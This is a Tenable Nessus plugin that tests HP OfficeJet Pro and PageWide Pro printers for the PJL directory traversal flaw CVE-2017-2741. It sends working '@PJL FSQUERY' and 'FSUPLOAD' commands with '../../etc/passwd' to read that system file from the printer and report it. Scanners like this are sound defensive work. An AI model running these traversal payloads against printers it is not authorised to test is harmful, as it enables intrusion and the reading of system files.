#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(100461);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2017/05/26 16:06:48 $");

  script_cve_id("CVE-2017-2741");
  script_osvdb_id(155578);
  script_xref(name:"HP", value:"HPSBPI03555");
  script_xref(name:"HP", value:"c05462914");

  script_name(english:"HP OfficeJet Pro and PageWide Pro PJL Interface Directory Traversal RCE");
  script_summary(english:"Attempts to read /etc/passwd.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote HP OfficeJet Pro or PageWide Pro printer is affected by an
unspecified flaw in the Printer Job Language (PJL) interface, within
various PJL and PostScript file handling functions, due to improper
sanitization of user-supplied input. An unauthenticated, remote
attacker can exploit this, via directory traversal, to write arbitrary
files, resulting in the execution of arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"https://support.hp.com/lv-en/document/c05462914");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate firmware update according to the vendor
advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:N");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/04/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/05/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:hp:officejet_pro");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:hp:pagewide_pro");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("pjl_detect.nasl");
  script_require_ports("Services/jetdirect", 9100);
  script_require_keys("devices/hp_printer");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"jetdirect", default:9100, exit_on_fail:TRUE);
device = get_kb_item_or_exit('jetdirect/' + port + '/info');
if ('HP OfficeJet' >!< device && 'HP PageWide' >!< device)
{
  audit(AUDIT_HOST_NOT, "an affected HP printer");
}

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "TCP");

# Check if we can read etc passwd
pjl_cmd = '@PJL FSQUERY NAME="../../etc/passwd"\r\n';
send(socket:soc, data:pjl_cmd);

# Receive the status of the file
resp = recv(socket:soc, length:1024);
if (isnull(resp)) audit(AUDIT_RESP_NOT, port, "the FSQUERY request");

# Check to see if the directory traversal works
if ("TYPE=FILE SIZE=" >!< resp) audit(AUDIT_HOST_NOT, "an affected HP printer");

# Get the size of the file
match = pregmatch(pattern:'TYPE=FILE SIZE=([0-9]+)', string:resp);
if (isnull(match)) audit(AUDIT_RESP_BAD, port, "the FSQUERY request");

pjl_cmd = '@PJL FSUPLOAD NAME="../../etc/passwd" OFFSET=0 SIZE=' + match[1] + '\r\n';
send(socket:soc, data:pjl_cmd);

resp = recv(socket:soc, length:1024);
close(soc);

# verify the response is as expected
if (isnull(resp) || "FSUPLOAD" >!< resp || "/bin/sh" >!< resp)
{
  audit(AUDIT_RESP_BAD, port, "the FSUPLOAD request");
}

# trim off the first line since its the echo of the FSUPLOAD
etc_start = stridx(resp, '\r\n');
resp = substr(resp, etc_start + 2);

security_report_v4(
  port:port,
  severity:SECURITY_HOLE,
  file:'/etc/passwd',
  output:resp,
  request:make_list(pjl_cmd));
